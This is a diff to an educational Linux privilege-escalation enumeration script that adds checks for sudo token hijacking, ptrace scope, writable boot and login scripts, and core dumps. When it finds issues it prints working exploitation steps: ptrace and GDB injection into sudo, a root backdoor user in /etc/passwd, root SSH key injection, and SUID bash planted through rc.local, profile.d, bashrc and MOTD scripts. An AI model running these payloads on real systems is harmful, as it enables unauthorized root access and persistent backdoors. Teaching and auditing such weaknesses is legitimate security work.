@@ -2214,7 +2214,7 @@ enum_sudo_version() {
 enum_sudo2() {
     log "${COLOR_PURPLE}[SUDO PERMISSIONS]${COLOR_RESET}"
     if sudo -l 2>&1 | grep -v "not allowed"; then
-        critical "Sudo access confirmed"
+        warn "Sudo access confirmed"
         return 0
     else
         warn "No sudo access"
@@ -3012,8 +3012,357 @@ enum_databases() {
     fi
 }
 
-#!/bin/bash
-
+# === SUDO TOKEN HIJACKING ===
+enum_sudo_tokens() {
+    section "SUDO TOKEN HIJACKING"
+    
+    # === PHASE 1: SILENT SCAN - Collect all findings ===
+    local temp_readable_tokens="/tmp/.learnpeas_sudo_tokens_$$"
+    local temp_ptrace_enabled="/tmp/.learnpeas_ptrace_$$"
+    local temp_sudo_processes="/tmp/.learnpeas_sudo_procs_$$"
+    local found_issues=0
+    
+    cleanup_sudo_token_temps() {
+        rm -f "$temp_readable_tokens" "$temp_ptrace_enabled" "$temp_sudo_processes" 2>/dev/null
+    }
+    trap cleanup_sudo_token_temps RETURN
+    
+    # Check if sudo token directory exists and is accessible
+    if [ -d /var/run/sudo/ts ]; then
+        # Check if we can list the directory
+        if ls /var/run/sudo/ts/ >/dev/null 2>&1; then
+            # Find readable token files
+            find /var/run/sudo/ts/ -type f -readable 2>/dev/null | while read token; do
+                local owner=$(stat -c %U "$token" 2>/dev/null)
+                local perms=$(stat -c %a "$token" 2>/dev/null)
+                
+                # Skip our own tokens
+                if [ "$owner" != "$(whoami)" ]; then
+                    echo "$token|$owner|$perms" >> "$temp_readable_tokens"
+                    found_issues=1
+                fi
+            done
+        fi
+    fi
+    
+    # Check ptrace_scope (needed for token hijacking via ptrace)
+    if [ -r /proc/sys/kernel/yama/ptrace_scope ]; then
+        local ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
+        
+        # 0 = unrestricted (can ptrace any process of same user)
+        # 1 = restricted (can only ptrace descendants)
+        # 2 = admin-only
+        # 3 = disabled
+        
+        if [ "$ptrace_scope" = "0" ]; then
+            echo "0|unrestricted" >> "$temp_ptrace_enabled"
+            found_issues=1
+        elif [ "$ptrace_scope" = "1" ]; then
+            # Still useful if we can find sudo processes we spawned
+            echo "1|restricted" >> "$temp_ptrace_enabled"
+        fi
+    fi
+    
+    # Check for active sudo processes from other users (non-root)
+    ps aux | grep -E "sudo|su " | grep -v grep | while read line; do
+        local proc_user=$(echo "$line" | awk '{print $1}')
+        local proc_pid=$(echo "$line" | awk '{print $2}')
+        
+        # Skip our own processes AND root processes (can't ptrace root unless you're root)
+        if [ "$proc_user" != "$(whoami)" ] && [ "$proc_user" != "root" ]; then
+            echo "$proc_user|$proc_pid|$line" >> "$temp_sudo_processes"
+        fi
+    done
+    
+    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
+    if [ $found_issues -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  SUDO TOKEN HIJACKING - Understanding the Attack"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT ARE SUDO TOKENS:"
+        teach "  When you run sudo successfully, Linux creates a 'timestamp file'"
+        teach "  in /var/run/sudo/ts/ that remembers you're authenticated."
+        teach "  Default: Valid for 15 minutes (no password needed again)."
+        teach ""
+        teach "HOW SUDO TOKENS WORK:"
+        teach "  1. User runs: sudo whoami"
+        teach "  2. Sudo prompts for password"
+        teach "  3. User enters correct password"
+        teach "  4. Sudo creates: /var/run/sudo/ts/username"
+        teach "  5. For next 15 minutes, no password needed"
+        teach "  6. Token stored in memory AND file"
+        teach ""
+        teach "THE VULNERABILITY:"
+        teach "  If you can READ another user's sudo token file OR"
+        teach "  PTRACE their sudo process, you can steal their session."
+        teach ""
+        teach "WHY THIS MATTERS:"
+        teach "  User A runs: sudo apt update (enters password)"
+        teach "  → Token valid for 15 minutes"
+        teach "  → You (User B) hijack their token"
+        teach "  → You can now: sudo bash (as User A, no password!)"
+        teach "  → If User A can sudo to root, YOU can sudo to root"
+        teach ""
+        teach "TWO ATTACK METHODS:"
+        teach ""
+        teach "  Method 1 - Direct Token Theft (if tokens readable):"
+        teach "    • Rare, but happens with misconfigured permissions"
+        teach "    • Copy victim's token file to your location"
+        teach "    • Use sudo as victim"
+        teach ""
+        teach "  Method 2 - Ptrace Injection (if ptrace_scope=0):"
+        teach "    • Attach to victim's sudo process with gdb/ptrace"
+        teach "    • Inject shellcode to bypass authentication"
+        teach "    • OR extract token from process memory"
+        teach "    • More common, works if ptrace allowed"
+        teach ""
+        teach "REQUIREMENTS:"
+        teach "  Direct theft:"
+        teach "    ✓ Victim's token file readable (/var/run/sudo/ts/victim)"
+        teach "    ✓ Victim has active sudo session (within 15 min)"
+        teach ""
+        teach "  Ptrace injection:"
+        teach "    ✓ ptrace_scope = 0 (unrestricted)"
+        teach "    ✓ Active sudo process from victim user"
+        teach "    ✓ You can ptrace processes of same privilege level"
+        teach ""
+        teach "WHY ADMINS MISCONFIGURE THIS:"
+        teach "  • Token directory permissions wrong (chmod 777 /var/run/sudo)"
+        teach "  • ptrace_scope=0 for debugging (then forgotten)"
+        teach "  • Shared dev environments (multiple users, convenience)"
+        teach "  • Docker containers (often run with ptrace_scope=0)"
+        log ""
+    fi
+    
+    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
+    
+    # Report readable tokens (CRITICAL - direct exploit)
+    if [ -s "$temp_readable_tokens" ]; then
+        critical "READABLE SUDO TOKENS - Steal other users' sudo sessions"
+        log ""
+        
+        while IFS='|' read -r token owner perms; do
+            critical "Token readable: $token"
+            vuln "Owner: $owner | Permissions: $perms"
+        done < "$temp_readable_tokens"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  DIRECT TOKEN THEFT EXPLOITATION"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "STEP-BY-STEP EXPLOITATION:"
+        teach ""
+        teach "  Step 1 - Verify token is fresh (within 15 minutes):"
+        local first_token=$(head -1 "$temp_readable_tokens" | cut -d'|' -f1)
+        local first_owner=$(head -1 "$temp_readable_tokens" | cut -d'|' -f2)
+        teach "    stat $first_token"
+        teach "    # Check 'Modify' timestamp - if recent, token is active"
+        teach ""
+        teach "  Step 2 - Check victim's sudo permissions:"
+        teach "    sudo -l -U $first_owner"
+        teach "    # See what $first_owner can run with sudo"
+        teach ""
+        teach "  Step 3 - Attempt to use their token:"
+        teach "    # This is VERY distribution-specific and often doesn't work"
+        teach "    # Modern sudo checks UID matching between token and process"
+        teach "    # But worth trying:"
+        teach ""
+        teach "    # Method A - If sudo version is old (<1.8.15):"
+        teach "    sudo -u $first_owner sudo bash"
+        teach ""
+        teach "    # Method B - Try copying token to your location:"
+        teach "    cp $first_token /var/run/sudo/ts/\$(whoami)"
+        teach "    sudo -k  # Reset your own token"
+        teach "    sudo bash  # Try using copied token"
+        teach ""
+        teach "  REALISTIC EXPECTATION:"
+        teach "    Direct token theft rarely works on modern systems."
+        teach "    Readable tokens are still a finding (should be 700),"
+        teach "    but ptrace method (below) is more reliable."
+        teach ""
+        teach "  WHY IT FAILS:"
+        teach "    Modern sudo (>1.8.15) validates:"
+        teach "    • Token UID matches process UID"
+        teach "    • Token session ID matches current session"
+        teach "    • TTY matches (if token was created with TTY)"
+        teach ""
+        teach "  WHEN IT WORKS:"
+        teach "    • Very old sudo versions"
+        teach "    • Custom sudo builds without validation"
+        teach "    • Race conditions during token check"
+        log ""
+    fi
+    
+    # Report ptrace capability (MEDIUM - requires more work)
+    if [ -s "$temp_ptrace_enabled" ]; then
+        while IFS='|' read -r scope status; do
+            if [ "$scope" = "0" ]; then
+                critical "PTRACE UNRESTRICTED - Can inject into other users' sudo processes"
+                vuln "ptrace_scope = 0 (unrestricted)"
+                log ""
+                
+                teach "╔═══════════════════════════════════════════════════════════╗"
+                teach "║  PTRACE INJECTION EXPLOITATION"
+                teach "╚═══════════════════════════════════════════════════════════╝"
+                teach ""
+                teach "WHAT IS PTRACE:"
+                teach "  ptrace() is the system call debuggers use to inspect/control"
+                teach "  other processes. When ptrace_scope=0, you can attach to ANY"
+                teach "  process running as your user or same privilege level."
+                teach ""
+                teach "THE ATTACK:"
+                teach "  1. Victim user runs: sudo whoami (enters password)"
+                teach "  2. Sudo process is now running, token in memory"
+                teach "  3. You attach with gdb/ptrace to the sudo process"
+                teach "  4. Inject code to bypass password OR steal token"
+                teach "  5. Run your own sudo commands using hijacked session"
+                teach ""
+                teach "EXPLOITATION WITH SUDO_INJECT:"
+                teach ""
+                teach "  Tool: https://github.com/nongiach/sudo_inject"
+                teach ""
+                teach "  Step 1 - Find active sudo process:"
+                teach "    ps aux | grep sudo | grep -v grep"
+                teach "    # Look for sudo processes from other users"
+                teach ""
+                
+                if [ -s "$temp_sudo_processes" ]; then
+                    teach "  Active sudo processes found:"
+                    while IFS='|' read -r proc_user proc_pid proc_line; do
+                        teach "    User: $proc_user | PID: $proc_pid"
+                    done < "$temp_sudo_processes"
+                    teach ""
+                    
+                    local first_pid=$(head -1 "$temp_sudo_processes" | cut -d'|' -f2)
+                    teach "  Step 2 - Download sudo_inject:"
+                    teach "    git clone https://github.com/nongiach/sudo_inject"
+                    teach "    cd sudo_inject"
+                    teach "    make"
+                    teach ""
+                    teach "  Step 3 - Inject into sudo process:"
+                    teach "    ./sudo_inject $first_pid"
+                    teach "    # This injects shellcode that removes password check"
+                    teach ""
+                    teach "  Step 4 - Run sudo as that user:"
+                    teach "    sudo bash"
+                    teach "    # Should work without password prompt"
+                else
+                    teach "  Step 2 - Wait for victim to run sudo:"
+                    teach "    watch -n 1 'ps aux | grep sudo'"
+                    teach "    # When you see their sudo process, note the PID"
+                    teach ""
+                    teach "  Step 3 - Download sudo_inject:"
+                    teach "    git clone https://github.com/nongiach/sudo_inject"
+                    teach "    cd sudo_inject"
+                    teach "    make"
+                    teach ""
+                    teach "  Step 4 - Inject into sudo process:"
+                    teach "    ./sudo_inject [PID]"
+                    teach ""
+                    teach "  Step 5 - Run sudo:"
+                    teach "    sudo bash"
+                fi
+                teach ""
+                teach "ALTERNATIVE - Manual GDB Method:"
+                teach "  # More complex but doesn't need tools"
+                teach "  gdb -p [SUDO_PID]"
+                teach "  (gdb) call (int)setuid(0)"
+                teach "  (gdb) call (int)system(\"/bin/bash\")"
+                teach "  (gdb) quit"
+                teach ""
+                teach "WHY THIS WORKS:"
+                teach "  • ptrace_scope=0 allows attaching to same-user processes"
+                teach "  • sudo runs with your UID (but EUID=0 temporarily)"
+                teach "  • You can inject code into sudo's memory space"
+                teach "  • Injected code bypasses password validation"
+                teach "  • OR you can directly call setuid(0) from injected context"
+                log ""
+            elif [ "$scope" = "1" ]; then
+                warn "ptrace_scope = 1 (restricted to descendants)"
+                log ""
+                teach "PARTIAL PROTECTION:"
+                teach "  ptrace_scope=1 means you can only ptrace processes you spawned."
+                teach "  You CANNOT directly ptrace other users' sudo processes."
+                teach ""
+                teach "POSSIBLE BYPASS:"
+                teach "  If you can trick victim into running sudo inside YOUR shell:"
+                teach "  1. Create malicious script that calls sudo"
+                teach "  2. Victim executes your script"
+                teach "  3. sudo becomes descendant of your shell"
+                teach "  4. Now you can ptrace it"
+                teach ""
+                teach "Example:"
+                teach "  # Create script that victim will run"
+                teach "  echo 'sudo whoami' > /tmp/check.sh"
+                teach "  chmod +x /tmp/check.sh"
+                teach "  # Social engineer victim to run it"
+                teach "  # When they do, sudo is your descendant"
+                teach "  ps aux | grep sudo  # Get PID"
+                teach "  gdb -p [PID]        # Now you can attach"
+                log ""
+            fi
+        done < "$temp_ptrace_enabled"
+    fi
+    
+    # Report active sudo processes (INFO - opportunity exists)
+    if [ -s "$temp_sudo_processes" ]; then
+        info "Active sudo processes from other users detected:"
+        log ""
+        
+        while IFS='|' read -r proc_user proc_pid proc_line; do
+            info "User: $proc_user | PID: $proc_pid"
+            log "  Process: $(echo "$proc_line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')"
+        done < "$temp_sudo_processes"
+        
+        log ""
+        teach "TIMING WINDOW:"
+        teach "  These processes indicate users who recently ran sudo."
+        teach "  If ptrace is enabled, these are your targets."
+        teach "  Token remains valid for ~15 minutes after sudo exits."
+        log ""
+    fi
+    
+    # === PHASE 4: CLEAN SUMMARY ===
+    log ""
+    if [ $found_issues -eq 0 ]; then
+        ok "No sudo token hijacking opportunities detected"
+        log ""
+        teach "CHECKS PERFORMED:"
+        teach "  ✓ Sudo token files (/var/run/sudo/ts/) - Not readable"
+        teach "  ✓ ptrace_scope - Restrictive (or not exploitable)"
+        teach "  ✓ Active sudo processes - None from other users"
+        log ""
+        teach "SUDO TOKEN SECURITY:"
+        teach "  Your system appears protected against token theft."
+        teach "  Token files are properly restricted (mode 0700)."
+        teach "  ptrace is either restricted or disabled."
+    else
+        log ""
+        teach "═══════════════════════════════════════════════════════════"
+        teach "SUDO TOKEN HIJACKING SUMMARY"
+        teach "═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "EXPLOITATION PRIORITY:"
+        teach "  1. Readable tokens (rare but instant)"
+        teach "  2. Ptrace injection (more common, requires tools)"
+        teach "  3. Wait for sudo activity (timing-based)"
+        teach ""
+        teach "DETECTION METHODS:"
+        teach "  • Monitor /var/run/sudo/ts/ for new tokens"
+        teach "  • Watch for sudo processes: watch -n1 'ps aux | grep sudo'"
+        teach "  • Check timestamp of token files (stat)"
+        teach ""
+        teach "DEFENSE (as admin):"
+        teach "  • Ensure /var/run/sudo/ts/ has mode 0700"
+        teach "  • Set ptrace_scope=1 or higher"
+        teach "  • Reduce sudo timeout (timestamp_timeout in sudoers)"
+        teach "  • Use sudo -k to clear tokens after sensitive operations"
+        log ""
+    fi
+}
 # === ENHANCED WEB APPLICATION ENUMERATION ===
 enum_web() {
     [ $EXTENDED -eq 0 ] && return
@@ -3169,7 +3518,6 @@ enum_web() {
             fi
             
             # === CHECK 7: Web Shell Detection (Improved) ===
-            # Whitelist of known safe files that contain suspicious patterns
             local safe_patterns="class-phpmailer\.php|class-smtp\.php|class-ftp\.php|class-ftp-sockets\.php|"
             safe_patterns+="file\.php.*wp-admin|Filesystem\.php|Process\.php|vendor/|node_modules/|"
             safe_patterns+="wp-includes/.*\.php|laravel/framework"
@@ -3295,7 +3643,7 @@ enum_web() {
     # Report configs with credentials
     if [ -f "$temp_configs" ]; then
         while IFS='|' read -r config is_writable; do
-            critical "Config contains credentials: $config"
+            critical "${WORK}[INTERESTING]${RST} Config contains credentials: $config"
             vuln "Configuration file with credentials: $config"
             
             # Show actual credentials (first 3 matches)
@@ -3318,18 +3666,18 @@ enum_web() {
             vuln "WordPress installation: $webroot"
             
             if [ "$wp_readable" = "1" ]; then
-                critical "wp-config.php is READABLE - contains database credentials"
+                critical "${WORK}[INTERESTING]${RST} wp-config.php is READABLE - contains database credentials"
                 vuln "WordPress config readable: $webroot/wp-config.php"
                 
                 # Extract and show DB credentials
                 if grep -E "DB_PASSWORD|DB_USER|DB_NAME" "$webroot/wp-config.php" 2>/dev/null | grep -q "."; then
-                    critical "Database credentials in wp-config.php"
+                    critical "${WORK}[INTERESTING]${RST} Database credentials in wp-config.php"
                     grep -E "DB_PASSWORD|DB_USER|DB_NAME|DB_HOST" "$webroot/wp-config.php" 2>/dev/null | grep -v "put your"
                 fi
             fi
             
             if [ "$has_backups" = "1" ]; then
-                critical "wp-config backup found - may contain credentials"
+                critical "${WORK}[INTERESTING]${RST} wp-config backup found - may contain credentials"
                 find "$webroot" -maxdepth 1 -name "wp-config.php*" ! -name "wp-config.php" -readable 2>/dev/null
             fi
             
@@ -4336,6 +4684,355 @@ enum_processes() {
     log ""
     if [ ! -s "$temp_cred_procs" ] && [ ! -s "$temp_sessions" ]; then
         ok "No exposed credentials or hijackable sessions detected"
+    fi
+}
+
+# === BOOT SCRIPT ANALYSIS ===
+enum_boot_scripts() {
+    section "BOOT & LOGIN SCRIPT ANALYSIS"
+    
+    # === PHASE 1: SILENT SCAN - Collect all findings ===
+    local temp_writable_boot="/tmp/.learnpeas_boot_scripts_$$"
+    local temp_writable_profile="/tmp/.learnpeas_profile_scripts_$$"
+    local temp_writable_motd="/tmp/.learnpeas_motd_scripts_$$"
+    local temp_writable_bashrc="/tmp/.learnpeas_bashrc_$$"
+    local found_issues=0
+    
+    cleanup_boot_temps() {
+        rm -f "$temp_writable_boot" "$temp_writable_profile" "$temp_writable_motd" "$temp_writable_bashrc" 2>/dev/null
+    }
+    trap cleanup_boot_temps RETURN
+    
+    # Check /etc/rc.local (classic boot script)
+    if [ -f /etc/rc.local ]; then
+        if [ -w /etc/rc.local ]; then
+            echo "/etc/rc.local" >> "$temp_writable_boot"
+            found_issues=1
+        fi
+    fi
+    
+    # Check /etc/profile.d/*.sh (runs for all logins)
+    if [ -d /etc/profile.d ]; then
+        if [ -w /etc/profile.d ]; then
+            echo "/etc/profile.d|directory" >> "$temp_writable_profile"
+            found_issues=1
+        fi
+        
+        find /etc/profile.d -name "*.sh" -type f 2>/dev/null | while read script; do
+            if [ -w "$script" ]; then
+                echo "$script|file" >> "$temp_writable_profile"
+                found_issues=1
+            fi
+        done
+    fi
+    
+    # Check /etc/bash.bashrc (global bash config)
+    if [ -f /etc/bash.bashrc ]; then
+        if [ -w /etc/bash.bashrc ]; then
+            echo "/etc/bash.bashrc" >> "$temp_writable_bashrc"
+            found_issues=1
+        fi
+    fi
+    
+    # Check /etc/bashrc (CentOS/RHEL alternative)
+    if [ -f /etc/bashrc ]; then
+        if [ -w /etc/bashrc ]; then
+            echo "/etc/bashrc" >> "$temp_writable_bashrc"
+            found_issues=1
+        fi
+    fi
+    
+    # Check /etc/profile (global profile)
+    if [ -f /etc/profile ]; then
+        if [ -w /etc/profile ]; then
+            echo "/etc/profile" >> "$temp_writable_bashrc"
+            found_issues=1
+        fi
+    fi
+    
+    # Check /etc/update-motd.d/* (message of the day scripts)
+    if [ -d /etc/update-motd.d ]; then
+        if [ -w /etc/update-motd.d ]; then
+            echo "/etc/update-motd.d|directory" >> "$temp_writable_motd"
+            found_issues=1
+        fi
+        
+        find /etc/update-motd.d -type f 2>/dev/null | while read script; do
+            if [ -w "$script" ]; then
+                echo "$script|file" >> "$temp_writable_motd"
+                found_issues=1
+            fi
+        done
+    fi
+    
+    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
+    if [ $found_issues -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  BOOT & LOGIN SCRIPTS - Understanding Execution Context"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT ARE BOOT/LOGIN SCRIPTS:"
+        teach "  Scripts that execute automatically during system boot or"
+        teach "  when users log in. They run with the privileges of the"
+        teach "  user logging in or as root during boot."
+        teach ""
+        teach "EXECUTION TIMELINE:"
+        teach "  1. BOOT PHASE:"
+        teach "     • System starts"
+        teach "     • /etc/rc.local executes (as root, legacy but still works)"
+        teach "     • Commands run before any user logs in"
+        teach ""
+        teach "  2. LOGIN PHASE:"
+        teach "     • User SSH/console login"
+        teach "     • /etc/profile.d/*.sh execute (as logging-in user)"
+        teach "     • /etc/bash.bashrc executes (as logging-in user)"
+        teach "     • Commands run every time user logs in"
+        teach ""
+        teach "  3. MOTD PHASE:"
+        teach "     • User connects (SSH/login)"
+        teach "     • /etc/update-motd.d/* scripts execute (as root!)"
+        teach "     • Generate 'Message of the Day' banner"
+        teach ""
+        teach "WHY MISCONFIGURATIONS HAPPEN:"
+        teach ""
+        teach "  Scenario 1 - The Quick Fix Admin:"
+        teach "    Admin needs: 'Run this command on every boot'"
+        teach "    Solution: 'I'll add it to rc.local'"
+        teach "    Mistake: chmod 666 /etc/rc.local (too permissive)"
+        teach "    Reality: Any user can now add root commands"
+        teach ""
+        teach "  Scenario 2 - The Helpful MOTD:"
+        teach "    Admin wants: 'Show system stats on login'"
+        teach "    Solution: 'Add script to /etc/update-motd.d/'"
+        teach "    Mistake: Forgets scripts run as ROOT"
+        teach "    Reality: Your code executes with root privileges"
+        teach ""
+        teach "  Scenario 3 - The Team Environment:"
+        teach "    Developers need: 'Set PATH for whole team'"
+        teach "    Solution: 'Make /etc/profile.d/ writable'"
+        teach "    Mistake: Trusts all team members"
+        teach "    Reality: One compromised account = game over"
+        teach ""
+        teach "CRITICAL DISTINCTION:"
+        teach ""
+        teach "  /etc/rc.local:"
+        teach "    • Runs: At boot"
+        teach "    • User: root"
+        teach "    • Trigger: System reboot"
+        teach "    • Wait: Until next reboot (could be weeks/months)"
+        teach ""
+        teach "  /etc/profile.d/*.sh:"
+        teach "    • Runs: At every user login"
+        teach "    • User: The user logging in"
+        teach "    • Trigger: ANY user SSH/login"
+        teach "    • Wait: Seconds (next admin login)"
+        teach ""
+        teach "  /etc/update-motd.d/*:"
+        teach "    • Runs: At every login"
+        teach "    • User: ROOT (even for non-root logins!)"
+        teach "    • Trigger: ANY SSH connection"
+        teach "    • Wait: Instant (next SSH attempt)"
+        teach ""
+        teach "THE TIMING GAME:"
+        teach "  • rc.local = Patient attack (wait for reboot)"
+        teach "  • profile.d = Medium wait (next admin login)"
+        teach "  • update-motd.d = Instant (next SSH connection)"
+        log ""
+    fi
+    
+    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
+    
+    # Report writable rc.local
+    if [ -s "$temp_writable_boot" ]; then
+        critical "WRITABLE /etc/rc.local - Root command execution on next reboot"
+        log ""
+        
+        while IFS= read -r script; do
+            vuln "Writable boot script: $script"
+        done < "$temp_writable_boot"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  /etc/rc.local EXPLOITATION"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT IS rc.local:"
+        teach "  Legacy boot script that runs commands after all services"
+        teach "  have started. Executes as root, before any user logs in."
+        teach ""
+        teach "EXPLOITATION:"
+        teach ""
+        teach "  Method 1 - SUID Binary (Persistent):"
+        teach "    echo 'chmod u+s /bin/bash' >> /etc/rc.local"
+        teach "    # After reboot: /bin/bash -p"
+        teach ""
+        teach "  Method 2 - Backdoor User:"
+        teach "    echo 'echo \"backdoor:x:0:0::/root:/bin/bash\" >> /etc/passwd' >> /etc/rc.local"
+        teach "    # After reboot: su backdoor"
+        teach ""
+        teach "  Method 3 - SSH Key Injection:"
+        teach "    cat >> /etc/rc.local << 'EOF'"
+        teach "mkdir -p /root/.ssh"
+        teach "echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys"
+        teach "chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys"
+        teach "EOF"
+        teach "    # After reboot: ssh -i your_key root@target"
+        teach ""
+        teach "TRIGGERING:"
+        teach "  Wait for system reboot (passive)"
+        teach "  Monitor uptime to detect reboots: uptime"
+        log ""
+    fi
+    
+    # Report writable profile.d
+    if [ -s "$temp_writable_profile" ]; then
+        critical "WRITABLE /etc/profile.d - Code execution on next user login"
+        log ""
+        
+        while IFS='|' read -r item type; do
+            if [ "$type" = "directory" ]; then
+                critical "Writable directory: $item"
+            else
+                vuln "Writable script: $item"
+            fi
+        done < "$temp_writable_profile"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  /etc/profile.d EXPLOITATION"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "EXECUTION CONTEXT:"
+        teach "  Scripts run AS THE USER logging in"
+        teach "  Root login → runs as root"
+        teach "  Regular user → runs as that user"
+        teach ""
+        teach "EXPLOITATION:"
+        teach ""
+        teach "  Method 1 - Create New Script (if directory writable):"
+        teach "    cat > /etc/profile.d/00-system.sh << 'EOF'"
+        teach "#!/bin/bash"
+        teach "if [ \$(id -u) -eq 0 ]; then"
+        teach "    chmod u+s /bin/bash"
+        teach "fi"
+        teach "EOF"
+        teach "    chmod +x /etc/profile.d/00-system.sh"
+        teach "    # Wait for root/admin to login"
+        teach ""
+        teach "  Method 2 - Modify Existing Script:"
+        teach "    cat >> /etc/profile.d/existing.sh << 'EOF'"
+        teach "if [ \$(id -u) -eq 0 ]; then"
+        teach "    cp /bin/bash /tmp/.update && chmod 4755 /tmp/.update"
+        teach "fi"
+        teach "EOF"
+        teach ""
+        teach "TRIGGERING:"
+        teach "  Wait for ANY user login"
+        teach "  Root/admin login executes your payload as root"
+        log ""
+    fi
+    
+    # Report writable bashrc
+    if [ -s "$temp_writable_bashrc" ]; then
+        warn "WRITABLE GLOBAL BASH CONFIG - Code execution on every bash session"
+        log ""
+        
+        while IFS= read -r script; do
+            vuln "Writable bash config: $script"
+        done < "$temp_writable_bashrc"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  GLOBAL BASHRC EXPLOITATION"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT IS bash.bashrc:"
+        teach "  Executes for EVERY bash shell (interactive + non-interactive)"
+        teach "  More triggers than profile.d (which only runs on login)"
+        teach ""
+        teach "EXPLOITATION:"
+        teach ""
+        teach "  cat >> /etc/bash.bashrc << 'EOF'"
+        teach ""
+        teach "if [ \$(id -u) -eq 0 ] && [ ! -f /tmp/.configured ]; then"
+        teach "    chmod u+s /bin/bash"
+        teach "    touch /tmp/.configured"
+        teach "fi"
+        teach "EOF"
+        teach ""
+        teach "TRIGGERING:"
+        teach "  Every bash shell opened by any user"
+        teach "  Very frequent - happens constantly"
+        log ""
+    fi
+    
+    # Report writable motd
+    if [ -s "$temp_writable_motd" ]; then
+        critical "WRITABLE /etc/update-motd.d - ROOT execution on ANY SSH connection"
+        log ""
+        
+        while IFS='|' read -r item type; do
+            if [ "$type" = "directory" ]; then
+                critical "Writable directory: $item"
+            else
+                vuln "Writable MOTD script: $item"
+            fi
+        done < "$temp_writable_motd"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  MOTD EXPLOITATION - INSTANT ROOT"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "CRITICAL FACT:"
+        teach "  MOTD scripts run AS ROOT even when non-root users SSH!"
+        teach ""
+        teach "EXPLOITATION:"
+        teach ""
+        teach "  Method 1 - Create New Script:"
+        teach "    cat > /etc/update-motd.d/00-exploit << 'EOF'"
+        teach "#!/bin/sh"
+        teach "chmod u+s /bin/bash"
+        teach "EOF"
+        teach "    chmod +x /etc/update-motd.d/00-exploit"
+        teach ""
+        teach "  Method 2 - Modify Existing:"
+        teach "    cat >> /etc/update-motd.d/50-motd-news << 'EOF'"
+        teach ""
+        teach "if [ ! -f /tmp/.done ]; then"
+        teach "    cp /bin/bash /tmp/.sh && chmod 4755 /tmp/.sh"
+        teach "    touch /tmp/.done"
+        teach "fi"
+        teach "EOF"
+        teach ""
+        teach "TRIGGERING (INSTANT):"
+        teach "  ssh user@localhost  # From target machine"
+        teach "  ssh user@target     # From attack machine"
+        teach "  # Exit SSH session"
+        teach "  /bin/bash -p        # Root shell!"
+        teach ""
+        teach "WHY THIS IS POWERFUL:"
+        teach "  • Runs AS ROOT automatically"
+        teach "  • ANY SSH connection triggers it"
+        teach "  • No reboot needed"
+        teach "  • No waiting for admin"
+        teach "  • Instant exploitation"
+        log ""
+    fi
+    
+    # === PHASE 4: CLEAN SUMMARY ===
+    log ""
+    if [ $found_issues -eq 0 ]; then
+        ok "No writable boot/login scripts detected"
+    else
+        info "Boot/login script analysis complete"
+        teach ""
+        teach "EXPLOITATION PRIORITY:"
+        teach "  1. /etc/update-motd.d → Instant (trigger with SSH)"
+        teach "  2. /etc/profile.d → Fast (next user login)"
+        teach "  3. /etc/bash.bashrc → Fast (next bash shell)"
+        teach "  4. /etc/rc.local → Slow (next reboot)"
     fi
 }
 # === MAIL & LOGS ===
@@ -7239,7 +7936,437 @@ enum_env() {
         teach "Similar to LD_PRELOAD but points to directory containing evil library"
     fi
 }
-
+# === CORE DUMP ANALYSIS ===
+enum_core_dumps() {
+    section "CORE DUMP ANALYSIS"
+    
+    # === PHASE 1: SILENT SCAN - Collect all findings ===
+    local temp_core_files="/tmp/.learnpeas_core_files_$$"
+    local temp_readable_crashes="/tmp/.learnpeas_crashes_$$"
+    local temp_core_pattern="/tmp/.learnpeas_core_pattern_$$"
+    local found_issues=0
+    
+    cleanup_core_temps() {
+        rm -f "$temp_core_files" "$temp_readable_crashes" "$temp_core_pattern" 2>/dev/null
+    }
+    trap cleanup_core_temps RETURN
+    
+    # Check if core dumping is enabled
+    local ulimit_core=$(ulimit -c 2>/dev/null)
+    local core_enabled=0
+    
+    if [ "$ulimit_core" != "0" ]; then
+        core_enabled=1
+        echo "$ulimit_core" >> "$temp_core_pattern"
+        found_issues=1
+    fi
+    
+    # Check core_pattern (where cores are written)
+    if [ -r /proc/sys/kernel/core_pattern ]; then
+        local core_pattern=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)
+        if [ -n "$core_pattern" ] && [ "$core_pattern" != "core" ]; then
+            echo "$core_pattern" >> "$temp_core_pattern"
+        fi
+    fi
+    
+    # Check /var/crash/ (Ubuntu/Debian crash dumps)
+    if [ -d /var/crash ]; then
+        find /var/crash -type f -readable 2>/dev/null | while read crash; do
+            # Skip if it's just a lock file
+            echo "$crash" | grep -q "\.lock$" && continue
+            
+            local size=$(stat -c%s "$crash" 2>/dev/null)
+            # Only flag files > 1KB (actual crash dumps, not metadata)
+            if [ "$size" -gt 1024 ]; then
+                echo "$crash|$size" >> "$temp_readable_crashes"
+                found_issues=1
+            fi
+        done
+    fi
+    
+    # Search for core files in common locations
+    local core_locations=("/tmp" "/var/tmp" "/var/log" "/home" "/root" ".")
+    
+    for location in "${core_locations[@]}"; do
+        [ ! -d "$location" ] && continue
+        
+        # Find core files (core, core.PID, or *.core)
